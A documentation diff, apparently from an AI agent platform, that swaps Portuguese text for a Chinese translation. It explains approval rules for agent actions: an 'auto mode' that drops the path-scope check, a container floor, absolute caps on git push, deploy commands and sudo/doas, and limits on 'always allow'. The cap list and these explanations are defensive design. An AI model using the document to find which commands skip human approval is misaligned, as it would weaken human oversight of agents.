-escopo de caminho</strong> (<a href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-603 target=_blank rel="noopener noreferrer" class="">RN-603</a>,
-<a href=/brabo/dev/zh-Hans/adr/0167-modo-automatico-libera-o-escopo-de-caminho target=_blank rel="noopener noreferrer" class="">ADR 0167</a>). O
-repositório devolve também DE ONDE a autonomia veio
-(<code>AgentAutonomyRepository.resolve</code>: <code>especifica</code> ou <code>curinga</code>), e <code>decide()</code> a
-recebe como <code>ctx.autonomyOrigin</code>. Quando a curinga resolve para
-<code>auto_approve</code>, dois pedidos de aprovação somem: o <a href=#path-scope class="">teto de escopo de
-caminho</a> e o <code>require_approval</code> que um comando composto sintetiza
-para um segmento sem regra nenhuma. Então um agente em modo automático roda
-qualquer comando de terminal, mesmo fora da pasta do projeto — medido no
-<code>exp001</code>, 47 de 51 pedidos depois de o modo automático ser ligado vinham só do
-escopo, porque o dev agent roda dentro do container (<code>/work</code>) e o escopo
-compara com a raiz do HOST. Todo o resto fica: <code>deny</code> vence, um <code>ask</code> escrito
-no arquivo pergunta, o teto de efeito externo/privilegiado (push, PR, deploy,
-<code>sudo</code>/<code>doas</code>) roda primeiro e ignora a origem, e merge em branch protegida,
-<code>instruction_patch</code>, paralelismo e <code>container_remove</code> nunca auto-aprovam. Uma
-regra ESPECÍFICA (<code>terminal: auto_approve</code> ou <code>terminal: require_approval</code>)
-não é modo automático e mantém o teto de escopo.</p>
-<p>Quando um <code>git_merge</code> que o humano aprovou EXECUTA e o provider informa a PR
-como <code>merged</code>, a tarefa de onde a PR veio passa a <code>done</code> — uma vez: um merge
-repetido da mesma PR não a move de novo nem grava um segundo evento
-<code>backlog.task_status_changed</code> (<a href=/brabo/dev/zh-Hans/business-rules#rn-628 target=_blank rel="noopener noreferrer" class="">RN-628</a>). O merge
-em si nunca é automatizado (<a href=/brabo/dev/zh-Hans/business-rules#rn-418 target=_blank rel="noopener noreferrer" class="">RN-418</a>).</p>
-<p>Um <code>git_merge</code> é RECUSADO antes de ser criado quando a mesma PR já foi mergeada
-por uma execução anterior (409 <code>pr_ja_mergeado</code>) ou já tem uma proposta viva —
-pendente, aprovada ou auto-aprovada (409 <code>merge_ja_proposto</code>); uma negada ou
-falhada não impede tentar de novo. Aprovar um merge pendente cuja PR outra
-proposta já mergeou também é 409 <code>pr_ja_mergeado</code>, e a ação fica <code>pending</code>. Um
-gate de QA/SecOps ainda pendente NÃO é recusa: a aba de PRs e o chat só
-AVISAM, nomeando o gate, e o botão fica habilitado
-(<a href=/brabo/dev/zh-Hans/business-rules#rn-663 target=_blank rel="noopener noreferrer" class="">RN-663</a>).</p>
-<p>O "modo automático" exige <code>maintainer</code> — o mesmo papel que já protegia
-<code>PUT .../agent-autonomy</code> antes de a curinga existir. Desligá-lo reusa o toggle
-manual/auto que o card do agente já tinha em Visão geral/Executores: com a
-curinga gravada, o toggle passa a editar ELA em vez do tipo representativo de
-sempre, e "manual" nele é a mesma curinga regravada como <code>require_approval</code>.</p>
-<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=o-piso-do-container-rn-492rn-493-adr-0134>O piso do container (<a href=/brabo/dev/zh-Hans/business-rules#rn-492 target=_blank rel="noopener noreferrer" class="">RN-492</a>/<a href=/brabo/dev/zh-Hans/business-rules#rn-493 target=_blank rel="noopener noreferrer" class="">RN-493</a>, <a href=/brabo/dev/zh-Hans/adr/0134-dev-agents-executam-dentro-do-container target=_blank rel="noopener noreferrer" class="">ADR 0134</a>)<a href=#o-piso-do-container-rn-492rn-493-adr-0134 class=hash-link aria-label=o-piso-do-container-rn-492rn-493-adr-0134的直接链接 title=o-piso-do-container-rn-492rn-493-adr-0134的直接链接 translate=no>​</a></h3>
-<p>O nó <code>C0</code> do diagrama acima é novo: quando a ação é <code>terminal</code> E o projeto tem
-um container REGISTRADO como <code>running</code> em <code>project_containers</code>
-(<code>execution_mode: container</code> — conferido por <code>ProposeActionUseCase</code>, que já lê
-o mesmo ciclo de vida do container que o lado da execução lê), o valor BASE
-deixa de ser <code>require_approval</code> e começa como <code>auto_approve</code>.</p>
-<p>Isto é um piso, não um teto novo, e a distinção importa: toda etapa seguinte
-(<code>agent_autonomy</code>, <code>permissions.json</code>) já SUBSTITUI o valor base quando tem
-opinião explícita — é o mesmo mecanismo que já deixava uma regra <code>deny</code> ou um
-padrão <code>ask</code> sobrepor o <code>require_approval</code> padrão hoje. Partir de
-<code>auto_approve</code> em vez de <code>require_approval</code> não muda essa propriedade: um
-<code>deny</code> explícito ou um padrão <code>ask</code> que casa continua vencendo o piso
-exatamente como já vencia o padrão. E os quatro tetos abaixo (<code>S</code>, <code>Z</code>, <code>H</code> e
-a regra do comando composto) continuam valendo por cima, incondicionalmente,
-venha o <code>auto_approve</code> do piso ou de uma regra explícita — <code>git push</code> dentro de
-um container em execução continua <code>require_approval</code>, como sempre.</p>
-<p><strong>Por que isto é seguro: uma segunda fronteira, mais forte, não a ausência de
-uma.</strong> Fora de um container, o escopo de caminho LÉXICO abaixo
-(<code>comandoNoEscopo</code> contra <code>projectScopeRoot</code>, um caminho do HOST) é o que torna
-seguro auto-aprovar via <code>permissions.json allow</code>. Dentro do container real, o
-comando fisicamente não enxerga nada fora de <code>/work</code> — o mount namespace do
-Docker — e o broker revalida de forma independente que o <code>cwd</code> está dentro de
-<code>/work</code> antes de rodar qualquer coisa (<code>DiretorioForaDoEscopoError</code>). <strong>O
-escopo de caminho léxico continua rodando por cima do piso, sem mudança</strong>:
-<code>cwd</code>/<code>command</code> que chegam a <code>decide()</code> nunca são traduzidos para <code>/work</code> (essa
-tradução acontece depois, do lado do engine, logo antes de chamar o broker),
-então um comando que hoje seria marcado fora do escopo continua marcado fora do
-escopo com o piso ligado — é defesa em profundidade redundante, não
-substituição.</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418>A fronteira de efeito externo e comando privilegiado (RN-418)<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class=hash-link aria-label="A fronteira de efeito externo e comando privilegiado (RN-418)的直接链接" title="A fronteira de efeito externo e comando privilegiado (RN-418)的直接链接" translate=no>​</a></h2>
-<p><strong>Revisão do <a href=/brabo/dev/zh-Hans/adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica target=_blank rel="noopener noreferrer" class="">ADR 0065</a>
-pelo <a href=/brabo/dev/zh-Hans/adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny target=_blank rel="noopener noreferrer" class="">ADR 0102</a></strong>
-— uma decisão GLOBAL e explícita do dono do produto, confirmada depois de um
-aviso automático de segurança sobre a mudança (o histórico inteiro está no
-ADR). O que segue descreve o comportamento ATUAL; a versão anterior (<code>deny</code>
-incondicional, aplicado antes de qualquer etapa permissiva) foi substituída,
-não afrouxada — veja o porquê logo abaixo.</p>
-<p><code>git push</code>, <code>git remote add</code>/<code>set-url</code>, <code>git merge</code>, as CLIs dos providers
-(<code>gh pr create</code>, <code>gh pr merge</code>, <code>glab mr create</code>/<code>merge</code>, releases e
-workflow dispatch), comandos comuns de deploy (<code>kubectl apply</code>, <code>helm upgrade</code>, <code>terraform apply</code>, <code>docker push</code>, <code>npm publish</code>, ...) e agora
-também <code>sudo</code>/<code>doas</code> num comando de <code>terminal</code> são um <strong>TETO ABSOLUTO</strong> (e,
-desde a <a href=/brabo/dev/zh-Hans/business-rules#rn-689 target=_blank rel="noopener noreferrer" class="">RN-689</a>, também as ações TIPADAS
-<code>git_push</code> e <code>pr_open</code>, que até então a curinga <code>"*"</code>, uma regra específica ou
-o <code>permissions.json</code> promoviam a <code>auto_approve</code>) — no mesmo bloco final dos
-outros três tetos (veja <a href=#caps class="">"Tetos"</a> abaixo), aplicado depois de
-<code>agent_autonomy</code> e <code>permissions.json</code> já terem opinado: se o veredito até ali
-era <code>auto_approve</code>, ele vira <code>require_approval</code> incondicional. Nem a curinga
-<code>"*"</code> do "modo automático" nem uma entrada <code>allow</code> no <code>permissions.json</code>
-conseguem promovê-lo de volta.</p>
-<p><strong>Por que <code>require_approval</code> agora é seguro, quando antes exigia <code>deny</code>.</strong> O
-motivo histórico do <code>deny</code> era concreto: "sempre permitir" grava o padrão no
-<code>allow</code>, e um único clique bastaria para reabrir a porta para sempre. Essa
-brecha foi fechada NA FONTE, não contornada:
+<p><strong>节点 <code>Z</code> 改变了位置</strong>（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-418>RN-418</a>，修订
+<a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-106>RN-106</a>）：在本地 runner 到来之前，它紧跟在 IAM 之后并返回 <code>deny</code>——现在它是一个<strong>上限</strong>，与其他三个位于同一个最终块中，在
+<code>agent_autonomy</code> 和 <code>permissions.json</code> 已经给出意见之后应用。原因见下方
+<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="">“外部效果与特权命令的边界”</a>
+一节。</p>
+<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=自动模式agent_autonomy-的通配符rn-153>“自动模式”：<code>agent_autonomy</code> 的通配符（<a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-153>RN-153</a>）<a href=#自动模式agent_autonomy-的通配符rn-153 class=hash-link aria-label=自动模式agent_autonomy-的通配符rn-153的直接链接 title=自动模式agent_autonomy-的通配符rn-153的直接链接 translate=no>​</a></h3>
+<p>上图中的 <code>agent_autonomy 有意见？</code> 节点不知道、也无需知道意见来自<strong>具体</strong>规则（<code>actionType: "terminal"</code>）还是通配符 <code>actionType: "*"</code>——“自动模式”：该 agent <strong>任何</strong>动作类型的自主权，通过在
+<code>ApprovalCard</code> 上点击“自动模式”一键开启。解析发生在本图开始<strong>之前</strong>，只在一个仓储中：<code>DrizzleAgentAutonomyRepository.findMode</code> 在同一查询中查找具体规则和通配符，两者都存在时返回具体规则——在 <code>"*": auto_approve</code> 开启时写入 <code>terminal: deny</code>，仍会对该 agent 拒绝 <code>terminal</code>，同时放行其余。</p>
+<p>因此图中没有新增节点，而下面的上限对“自动模式”生效，是因为它们响应的是 <code>current.policy === 'auto_approve'</code>，而从不看其来源（<a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-154>RN-154</a>）。</p>
+<p><strong>有一个由产品负责人决定的例外：自动模式放开路径范围</strong>（<a class="" href=/brabo/dev/zh-Hans/business-rules/autenticacao#rn-603>RN-603</a>，
+<a class="" href=/brabo/dev/zh-Hans/adr/0167-modo-automatico-libera-o-escopo-de-caminho>ADR 0167</a>）。仓储还会返回自主权<strong>来自何处</strong>
+（<code>AgentAutonomyRepository.resolve</code>：<code>especifica</code> 或 <code>curinga</code>），<code>decide()</code> 以 <code>ctx.autonomyOrigin</code> 接收它。当通配符解析为
+<code>auto_approve</code> 时，两种审批请求消失：<a href=#path-scope class="">路径范围上限</a>，以及复合命令为没有任何规则的片段合成的 <code>require_approval</code>。于是处于自动模式的 agent 可以运行任何终端命令，即使在项目文件夹之外——在
+<code>exp001</code> 中测得，开启自动模式后 51 个请求中有 47 个只来自范围，因为 dev agent 在容器内（<code>/work</code>）运行，而范围与<strong>主机</strong>的根比较。其余一切保留：<code>deny</code> 胜出，文件中写的 <code>ask</code> 会询问，外部效果/特权上限（push、PR、deploy、
+<code>sudo</code>/<code>doas</code>）先运行并忽略来源，而合并到受保护 branch、
+<code>instruction_patch</code>、并行和 <code>container_remove</code> 从不自动批准。一条<strong>具体</strong>规则（<code>terminal: auto_approve</code> 或 <code>terminal: require_approval</code>）不是自动模式，保留范围上限。</p>
+<p>当人批准的 <code>git_merge</code> <strong>执行</strong>且 provider 报告 PR 为
+<code>merged</code> 时，PR 所来自的任务变为 <code>done</code>——仅一次：同一 PR 的重复合并不会再次移动它，也不会写入第二个
+<code>backlog.task_status_changed</code> 事件（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-628>RN-628</a>）。合并本身从不自动化（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-418>RN-418</a>）。</p>
+<p>当同一 PR 已被之前的一次执行合并（409 <code>pr_ja_mergeado</code>），或已有一个存活的提案——待处理、已批准或已自动批准（409 <code>merge_ja_proposto</code>）——时，<code>git_merge</code> 在创建之前即被<strong>拒绝</strong>；被拒绝或失败的提案不妨碍重试。批准一个其 PR 已被另一个提案合并的待处理合并同样是 409 <code>pr_ja_mergeado</code>，动作保持 <code>pending</code>。仍待处理的 QA/SecOps gate <strong>不是</strong>拒绝：PR 标签页和聊天只<strong>提示</strong>，点名该 gate，按钮保持可用
+（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-663>RN-663</a>）。</p>
+<p>“自动模式”需要 <code>maintainer</code>——与通配符出现之前就保护
+<code>PUT .../agent-autonomy</code> 的角色相同。关闭它复用 agent 卡片在概览/执行者中已有的手动/自动开关：写入通配符后，开关改为编辑<strong>它</strong>而不是一贯的代表类型，其中的“手动”就是同一个通配符被重写为 <code>require_approval</code>。</p>
+<h3 class="anchor anchorTargetStickyNavbar_PEh0" id=容器下限rn-492rn-493adr-0134>容器下限（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-492>RN-492</a>/<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-493>RN-493</a>，<a class="" href=/brabo/dev/zh-Hans/adr/0134-dev-agents-executam-dentro-do-container>ADR 0134</a>）<a href=#容器下限rn-492rn-493adr-0134 class=hash-link aria-label=容器下限rn-492rn-493adr-0134的直接链接 title=容器下限rn-492rn-493adr-0134的直接链接 translate=no>​</a></h3>
+<p>上图中的节点 <code>C0</code> 是新的：当动作是 <code>terminal</code> <strong>且</strong>项目在 <code>project_containers</code> 中有一个<strong>登记</strong>为 <code>running</code> 的容器
+（<code>execution_mode: container</code>——由 <code>ProposeActionUseCase</code> 检查，它已经读取执行侧读取的同一个容器生命周期）时，<strong>基础</strong>值不再是 <code>require_approval</code>，而以 <code>auto_approve</code> 开始。</p>
+<p>这是一个下限，不是新的上限，区别很重要：后续每一步
+（<code>agent_autonomy</code>、<code>permissions.json</code>）在有显式意见时本就会<strong>替换</strong>基础值——正是同一机制让 <code>deny</code> 规则或 <code>ask</code> 模式覆盖今天的默认 <code>require_approval</code>。从
+<code>auto_approve</code> 而不是 <code>require_approval</code> 出发不改变这一属性：显式的
+<code>deny</code> 或匹配的 <code>ask</code> 模式依旧胜过下限，正如它们胜过默认值。下面四个上限（<code>S</code>、<code>Z</code>、<code>H</code> 和复合命令规则）仍无条件地叠加在上面，无论 <code>auto_approve</code> 来自下限还是来自显式规则——在运行中的容器内 <code>git push</code> 依旧是 <code>require_approval</code>，一如既往。</p>
+<p><strong>为什么这是安全的：多了第二道更强的边界，而不是少了一道。</strong> 在容器之外，下面的<strong>词法</strong>路径范围
+（<code>comandoNoEscopo</code> 对照 <code>projectScopeRoot</code>，一个<strong>主机</strong>路径）是使通过 <code>permissions.json allow</code> 自动批准变得安全的东西。在真实容器内，命令物理上看不到 <code>/work</code> 之外的任何东西——Docker 的 mount namespace——而且 broker 在运行任何东西之前独立地重新验证 <code>cwd</code> 位于 <code>/work</code> 之内（<code>DiretorioForaDoEscopoError</code>）。<strong>词法路径范围继续在下限之上运行，没有变化</strong>：到达 <code>decide()</code> 的
+<code>cwd</code>/<code>command</code> 从不被转换为 <code>/work</code>（该转换稍后在 engine 一侧、就在调用 broker 之前发生），因此一个今天会被标记为超出范围的命令，在下限开启时依旧被标记为超出范围——这是冗余的纵深防御，而不是替代。</p>
+<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418>外部效果与特权命令的边界（RN-418）<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class=hash-link aria-label=外部效果与特权命令的边界（RN-418）的直接链接 title=外部效果与特权命令的边界（RN-418）的直接链接 translate=no>​</a></h2>
+<p><strong><a class="" href=/brabo/dev/zh-Hans/adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny>ADR 0102</a>
+对 <a class="" href=/brabo/dev/zh-Hans/adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica>ADR 0065</a>
+的修订</strong>——产品负责人一个<strong>全局</strong>且明确的决定，在一条关于该变更的自动安全警告之后得到确认（完整历史在 ADR 中）。下文描述<strong>当前</strong>行为；之前的版本（无条件 <code>deny</code>，在任何放行步骤之前应用）是被替换，而不是被放松——原因见下文。</p>
+<p><code>terminal</code> 命令中的 <code>git push</code>、<code>git remote add</code>/<code>set-url</code>、<code>git merge</code>、provider 的 CLI
+（<code>gh pr create</code>、<code>gh pr merge</code>、<code>glab mr create</code>/<code>merge</code>、release 和
+workflow dispatch）、常见的部署命令（<code>kubectl apply</code>、<code>helm upgrade</code>、<code>terraform apply</code>、<code>docker push</code>、<code>npm publish</code>……）以及现在的
+<code>sudo</code>/<code>doas</code> 都是<strong>绝对上限</strong>（并且自
+<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-689>RN-689</a> 起，<strong>有类型</strong>的动作
+<code>git_push</code> 和 <code>pr_open</code> 也是，此前通配符 <code>"*"</code>、具体规则或
+<code>permissions.json</code> 会把它们提升为 <code>auto_approve</code>）——与其他三个上限位于同一个最终块（见下方<a href=#caps class="">“上限”</a>），在
+<code>agent_autonomy</code> 和 <code>permissions.json</code> 已给出意见之后应用：如果到那时的裁定是 <code>auto_approve</code>，它就变为无条件的 <code>require_approval</code>。无论是“自动模式”的通配符
+<code>"*"</code> 还是 <code>permissions.json</code> 中的 <code>allow</code> 条目，都无法把它提升回去。</p>
+<p><strong>为什么现在 <code>require_approval</code> 是安全的，而以前需要 <code>deny</code>。</strong> <code>deny</code> 的历史原因很具体：“始终允许”会把模式写入
+<code>allow</code>，一次点击就足以永久重新打开这扇门。这个漏洞是在<strong>源头</strong>堵上的，而不是绕过：
 <code>ApproveAlwaysActionUseCase</code>/<code>patternsForAction</code>
-(<code>apps/api/src/application/use-cases/actions/approve-always-action.use-case.ts</code>)
-RECUSAM gravar padrão no <code>allow</code> para ação de terminal com efeito externo de
-git ou comando privilegiado — o usuário continua aprovando a instância
-específica pelo fluxo normal, mas "sempre permitir" nunca grava o padrão nesses
-dois casos. Sem essa recusa, o teto seria decorativo.</p>
-<p><code>sudo</code>/<code>doas</code> ganharam categoria própria em <code>external-effect.ts</code>
-(<code>comandoPrivilegiadoNoComando</code>), casando pelo VERBO em qualquer segmento —
-mesmo princípio de <code>efeitoExternoNoComando</code> para git, que continua casando por
-<strong>prefixo de token</strong>, ignorando flags globais no meio (<code>git -C /tmp push</code> casa
-com <code>git push</code>). Cada segmento de um comando composto é conferido: <code>pnpm test && git push origin main</code> é barrado pelo segundo segmento, do mesmo jeito
-que um comando composto já exige que todo segmento case para virar
-<code>auto_approve</code>.</p>
-<p>O teto não tira poder do agente: para git, a mensagem de erro continua
-apontando qual ação <strong>tipada</strong> usar — <code>git_push</code>, <code>git_merge</code> ou <code>pr_open</code> —,
-que nasce <code>proposed_action</code>, segue o pipeline normal e grava no event log o que
-foi enviado e para onde (é o caminho que o dev agent já usa hoje,
-<code>agent_io.ex</code>). <code>sudo</code>/<code>doas</code> não têm ação tipada equivalente — a mensagem só
-explica por que aquele comando exige decisão humana.</p>
-<p><strong>Onde isto mais importa agora</strong>: o
-<a href=/brabo/dev/zh-Hans/adr/0103-runner-local-execucao-na-maquina-do-usuario target=_blank rel="noopener noreferrer" class="">runner local</a>
-executa comandos JÁ aprovados na própria máquina do usuário, com os
-privilégios dele — é exatamente o cenário em que um <code>sudo</code> legítimo (ou uma
-tentativa de escapar via <code>sudo</code>) precisa de uma parada humana garantida por
-construção, não por convenção do <code>permissions.json</code>.</p>
-<p><strong><code>container_remove</code> (ADR 0136, <a href=/brabo/dev/zh-Hans/business-rules#rn-495 target=_blank rel="noopener noreferrer" class="">RN-495</a>)
-entra na mesma recusa de "sempre permitir"</strong>, por um mecanismo mais simples
-que o de cima: ele não é comando de <code>terminal</code> casado por token, é um
-<code>actionType</code> próprio, então <code>ApproveAlwaysActionUseCase</code> recusa o clique de
-saída para esse tipo — nenhum padrão é gravado, e o usuário aprova a instância
-específica pelo fluxo normal. <code>container_start</code> e <code>container_stop</code> NÃO são
-recusados assim: podem ser configurados <code>auto_approve</code>, mesmo calibre de
-<code>open_adr_pr</code>/<code>open_infra_pr</code> — <code>container_stop</code> nunca é semeado, e
-<code>container_start</code> é semeado para o agente de Infra no aceite do handoff dele
-desde o ADR 0190.</p>
-<p><strong>Ordem de um clique em "sempre permitir" (<a href=/brabo/dev/zh-Hans/business-rules#rn-642 target=_blank rel="noopener noreferrer" class="">RN-642</a>).</strong>
-A aprovação e o padrão são gravados na MESMA transação: o padrão (no <code>allow</code>,
-ou no <code>agent_autonomy</code> para um dev agent de módulo) e o evento
-<code>permission.granted</code> dele só são escritos depois de a transição para fora de
-<code>pending</code> ser válida, e um padrão que falha ao gravar desfaz a aprovação. O
-<code>permissions.json</code> é arquivo e não entra na transação — a janela residual é o
-commit falhar depois de o arquivo ter sido escrito, declarada. Clicar numa ação
-que já saiu de <code>pending</code> por uma APROVAÇÃO (um duplo clique, a mesma ação
-pendente mostrada em dois painéis) é sucesso idempotente,
-<code>desfecho: "ja_aprovada"</code>, que grava o padrão só se ele falta; clicar numa ação
-NEGADA continua <code>409</code> com <code>reason: "acao_ja_recusada"</code> e não grava nada. Os
-tetos acima são conferidos antes de tudo isso, mesmo para uma ação que já foi
-aprovada.</p>
-<p><strong>A metade TIPADA do teto (AT-320).</strong> Até 30/09 só o comando digitado
-<code>git push</code> era recusado; uma ação tipada <code>git_push</code> passava e gravava
-<code>GitPush()</code> no <code>allow</code>. "Sempre permitir" agora recusa, por tipo, a lista
-única <code>TIPOS_SEM_SEMPRE_PERMITIR</code>
-(<code>apps/api/src/domain/actions/sempre-permitir.ts</code>): <code>git_push</code>, <code>pr_open</code>,
-<code>git_merge</code>, <code>container_remove</code>, <code>instruction_patch</code>, <code>parallelize</code> e
-<code>raise_max_parallel</code> — <code>400</code> com <code>reason: "teto_do_sempre_permitir"</code>. O card
-de aprovação esconde o botão para a mesma lista (uma cópia conferida contra
-esta por teste). Quando entrou, isto NÃO mudou <code>decide()</code> nem o que a ativação
-da execução semeia; desde a <a href=/brabo/dev/zh-Hans/business-rules#rn-689 target=_blank rel="noopener noreferrer" class="">RN-689</a> os dois
-mudaram: <code>git_push</code> e <code>pr_open</code> estão dentro do teto da RN-418 em <code>decide()</code>
-(veja <a href=#caps class="">"Tetos"</a>), e ativar a execução semeia só <code>git_commit</code> como
-<code>auto_approve</code> para cada <code>dev-&lt;modulo></code>.</p>
-<p><strong>A unidade do padrão gravado: verbo + subcomando, um por segmento
-(<a href=/brabo/dev/zh-Hans/business-rules#rn-675 target=_blank rel="noopener noreferrer" class="">RN-675</a>, decisão do dono de 01/10).</strong> "Sempre
-permitir" não grava mais o comando inteiro byte a byte: cada segmento do
-comando (dividido em <code>&&</code>, <code>||</code>, <code>;</code>, <code>|</code>, <code>&</code>, como <code>decide()</code> o divide) vira
-um padrão — o verbo mais o subcomando quando o segundo token é uma palavra
-(<code>npm test</code>, <code>git status</code>, <code>mix test</code>, <code>npx vitest</code>), o verbo sozinho quando é
-um argumento que não é palavra (<code>cat src/x.ts</code> → <code>Terminal(cat)</code>,
-<code>cd ../lib</code> → <code>Terminal(cd)</code>), e o segmento EXATO quando o segundo token é uma
-flag (<code>ls -la src</code>) ou quando a unidade seria prefixo de um teto da RN-418
-(<code>git remote -v</code>, <code>gh pr list</code> ficam exatos). Um segmento que é prefixo de teto
-mesmo exato (<code>git</code> sozinho) não grava nada. <code>cd src/app && npm test</code> grava
-<code>Terminal(cd)</code> e <code>Terminal(npm test)</code>, e o próximo
-<code>cd lib/core && npm test -- --coverage</code> roda sem perguntar. O casamento
-continua por prefixo de token, os tetos continuam rodando depois do arquivo em
-<code>decide()</code>, e o escopo de caminho continua valendo fora do modo automático. O
-clique de um dev agent de módulo continua indo para o <code>agent_autonomy</code>, não
-para um padrão (<a href=/brabo/dev/zh-Hans/business-rules#rn-509 target=_blank rel="noopener noreferrer" class="">RN-509</a>).</p>
-<h2 class="anchor anchorTargetStickyNavbar_PEh0" id=path-scope>Escopo de caminho<a href=#path-scope class=hash-link aria-label="Escopo de caminho的直接链接" title="Escopo de caminho的直接链接" translate=no>​</a></h2>
-<p>Um comando de <code>terminal</code> é avaliado também por <strong>onde ele toca</strong>, não só pelo
-verbo (<a href=/brabo/dev/zh-Hans/adr/0055-escopo-de-caminho-na-politica-de-terminal target=_blank rel="noopener noreferrer" class="">ADR 0055</a>,
-<a href=/brabo/dev/zh-Hans/business-rules/custo#rn-075 target=_blank rel="noopener noreferrer" class="">RN-075</a>). A pasta do projeto —
-<code>&lt;PROJECT_WORKSPACES_ROOT>/&lt;workspace_dir_name></code>, onde moram o
-<code>permissions.json</code> e todos os worktrees dos agentes — é o <strong>escopo</strong>.
+（<code>apps/api/src/application/use-cases/actions/approve-always-action.use-case.ts</code>）
+<strong>拒绝</strong>为有 git 外部效果或特权命令的终端动作把模式写入 <code>allow</code>——用户仍通过正常流程批准具体实例，但在这两种情况下“始终允许”从不写入模式。没有这种拒绝，上限就只是装饰。</p>
+<p><code>sudo</code>/<code>doas</code> 在 <code>external-effect.ts</code> 中获得了自己的类别
+（<code>comandoPrivilegiadoNoComando</code>），在任何片段中按<strong>动词</strong>匹配——与 git 的 <code>efeitoExternoNoComando</code> 同一原则，后者仍按<strong>词元前缀</strong>匹配，忽略中间的全局 flag（<code>git -C /tmp push</code> 匹配
+<code>git push</code>）。复合命令的每个片段都会被检查：<code>pnpm test && git push origin main</code> 被第二个片段拦下，正如复合命令本就要求每个片段都匹配才能成为 <code>auto_approve</code>。</p>
+<p>上限并不剥夺 agent 的能力：对于 git，错误消息仍会指出应使用哪个<strong>有类型</strong>的动作——<code>git_push</code>、<code>git_merge</code> 或 <code>pr_open</code>——它以 <code>proposed_action</code> 诞生，走正常流水线，并在事件日志中记录发送了什么、发往何处（这是 dev agent 今天已经使用的路径，<code>agent_io.ex</code>）。<code>sudo</code>/<code>doas</code> 没有对应的有类型动作——消息只解释为什么该命令需要人工决定。</p>
+<p><strong>现在这一点最重要的地方</strong>：
+<a class="" href=/brabo/dev/zh-Hans/adr/0103-runner-local-execucao-na-maquina-do-usuario>本地 runner</a>
+以用户的权限在用户自己的机器上执行<strong>已经</strong>批准的命令——这正是合法的 <code>sudo</code>（或试图借 <code>sudo</code> 逃逸）需要一个由构造而非 <code>permissions.json</code> 惯例保证的人工停顿的场景。</p>
+<p><strong><code>container_remove</code>（ADR 0136，<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-495>RN-495</a>）
+也进入同样的“始终允许”拒绝</strong>，其机制比上面的更简单：它不是按词元匹配的 <code>terminal</code> 命令，而是一个独立的
+<code>actionType</code>，所以 <code>ApproveAlwaysActionUseCase</code> 对该类型直接拒绝这次点击——不写入任何模式，用户通过正常流程批准具体实例。<code>container_start</code> 和 <code>container_stop</code> <strong>不</strong>会这样被拒绝：它们可以配置为 <code>auto_approve</code>，与
+<code>open_adr_pr</code>/<code>open_infra_pr</code> 同一量级——<code>container_stop</code> 从不被预置，而
+<code>container_start</code> 自 ADR 0190 起在 Infra agent 的 handoff 被接受时为其预置。</p>
+<p><strong>“始终允许”一次点击的顺序（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-642>RN-642</a>）。</strong>
+批准与模式在<strong>同一</strong>事务中写入：模式（写入 <code>allow</code>，或对于模块 dev agent 写入 <code>agent_autonomy</code>）及其 <code>permission.granted</code> 事件只有在离开
+<code>pending</code> 的转换有效之后才写入，而模式写入失败会撤销批准。
+<code>permissions.json</code> 是文件，不进入事务——剩余窗口是文件写入后提交失败，这一点已声明。点击一个已因<strong>批准</strong>离开 <code>pending</code> 的动作（双击，同一个待处理动作显示在两个面板中）是幂等成功，
+<code>desfecho: "ja_aprovada"</code>，只在模式缺失时写入；点击一个<strong>已拒绝</strong>的动作仍是 <code>409</code>，带 <code>reason: "acao_ja_recusada"</code>，不写入任何东西。上面的上限在这一切之前检查，即使对已批准的动作也是如此。</p>
+<p><strong>上限的</strong>有类型<strong>一半（AT-320）。</strong> 直到 30/09，只有键入的命令
+<code>git push</code> 被拒绝；有类型的 <code>git_push</code> 动作会通过，并把
+<code>GitPush()</code> 写入 <code>allow</code>。“始终允许”现在按类型拒绝唯一的列表
+<code>TIPOS_SEM_SEMPRE_PERMITIR</code>
+（<code>apps/api/src/domain/actions/sempre-permitir.ts</code>）：<code>git_push</code>、<code>pr_open</code>、
+<code>git_merge</code>、<code>container_remove</code>、<code>instruction_patch</code>、<code>parallelize</code> 和
+<code>raise_max_parallel</code>——<code>400</code>，带 <code>reason: "teto_do_sempre_permitir"</code>。审批卡片对同一列表隐藏按钮（一个由测试对照此列表核对的副本）。它加入时<strong>并未</strong>改变 <code>decide()</code>，也未改变激活执行时预置的内容；自 <a class="" href=/brabo/dev/zh-Hans/business-rules#rn-689>RN-689</a> 起两者都变了：<code>git_push</code> 和 <code>pr_open</code> 在 <code>decide()</code> 中处于 RN-418 的上限之内
+（见<a href=#caps class="">“上限”</a>），而激活执行只为每个 <code>dev-&lt;modulo></code> 预置 <code>git_commit</code> 为
+<code>auto_approve</code>。</p>
+<p><strong>写入模式的单位：动词 + 子命令，每个片段一个
+（<a class="" href=/brabo/dev/zh-Hans/business-rules#rn-675>RN-675</a>，负责人 01/10 的决定）。</strong> “始终允许”不再逐字节写入整个命令：命令的每个片段（按 <code>&&</code>、<code>||</code>、<code>;</code>、<code>|</code>、<code>&</code> 拆分，与 <code>decide()</code> 的拆分方式一致）变成一个模式——当第二个词元是单词时为动词加子命令
